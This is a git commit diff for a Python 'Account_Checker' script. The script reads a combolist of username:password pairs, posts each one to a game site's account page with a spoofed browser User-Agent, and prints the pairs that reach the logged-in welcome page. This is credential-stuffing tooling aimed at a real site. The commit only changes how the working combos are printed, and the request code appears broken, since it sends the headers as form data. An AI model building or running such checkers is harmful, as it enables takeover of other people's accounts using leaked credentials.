ebf9f189db6683f4b0d46cc9fb02b4cb5720bc28
Nekerxd <nuvielxd_01@hotmail.com>
2022-11-08 21:00:20 -0300

    Python file fix

--- Python/Projetos/Account Check/Account_Checker.py
+++ Python/Projetos/Account Check/Account_Checker.py
@@ -7,11 +7,7 @@ url = "https://otpiece.com/account"
 for combo in combolist:
     seq = combo.strip()
     acc = seq.split(":")
-    
-    username = acc[0]
-    password = acc[1]
-    account = username + ":" + password
-    
+ 
     headers={
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition std-1)",
@@ -21,4 +17,4 @@ for combo in combolist:
     
     req = requests.post(url, data=headers).text
     if "Bem vindo a sua conta!" in req:
-        print(account)
+        print(acc[0] +  ":" + acc[1])
